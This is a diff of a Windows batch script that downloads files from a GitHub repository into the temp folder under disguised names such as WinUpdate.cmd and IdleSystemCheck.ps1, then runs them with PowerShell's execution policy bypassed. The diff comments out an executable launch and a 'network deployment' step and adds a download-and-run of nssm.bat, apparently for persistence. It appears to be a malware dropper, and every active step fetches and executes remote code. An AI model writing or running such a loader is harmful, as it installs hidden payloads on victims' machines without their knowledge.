@@ -29,16 +29,19 @@ if '%errorlevel%' NEQ '0' (
     :: Configure download URLs and file paths
 set "PS1_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/prep.cmd"
 set "PS1.2_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/scanner.ps1"
-set "EXE_URL=https://github.com/Drakovthe6th/TBuG/raw/master/Advance.exe"
+rem set "EXE_URL=https://github.com/Drakovthe6th/TBuG/raw/master/Advance.exe"
+set "PS1.3_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/nssm.bat"
 set "PS1_FILE=%temp%\WinUpdate.cmd"
 set "EXE_FILE=%temp%\SysRegistry.exe"
 set "PS1.2_FILE=%temp%\IdleSystemCheck.ps1"
+set "PS1.3_FILE=%temp%\nssm.bat"
 
 :: Download files using PowerShell
 echo Downloading files...
 powershell -Command "Invoke-WebRequest -Uri '%PS1_URL%' -OutFile '%PS1_FILE%'"
-powershell -Command "Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_FILE%'"
+rem powershell -Command "Invoke-WebRequest -Uri '%EXE_URL%' -OutFile '%EXE_FILE%'"
 powershell -Command "Invoke-WebRequest -Uri '%PS1.2_URL%' -OutFile '%PS1.2_FILE%'"
+powershell -Command "Invoke-WebRequest -Uri '%PS1.3_URL%' -OutFile '%PS1.3_FILE%'"
 
 :: Execute PowerShell script with unrestricted policy
 echo Executing PowerShell script...
@@ -49,12 +52,13 @@ echo Waiting for 60 seconds...
 timeout /t 60 /nobreak >nul
 
 :: Execute the downloaded program
-echo Launching executable...
-start "" "%EXE_FILE%"
+rem echo Launching executable...
+rem start "" "%EXE_FILE%"
+
+powershell -ExecutionPolicy Bypass -File "%PS1.3_FILE%"
 
 :: Execute deployment script with parameters
-echo Starting network deployment...
-powershell -ExecutionPolicy Bypass -Command "& '%PS1.2_FILE%' -UpdateServer 'https://github.com/Drakovthe6th/TBuG/raw/master/Advance.exe' -ExeName 'MonthlyUpdates.exe'"
-
+rem echo Starting network deployment...
+rem powershell -ExecutionPolicy Bypass -Command "& '%PS1.2_FILE%' -UpdateServer 'https://github.com/Drakovthe6th/TBuG/raw/master/Advance.exe' -ExeName 'MonthlyUpdates.exe'"
 
 endlocal
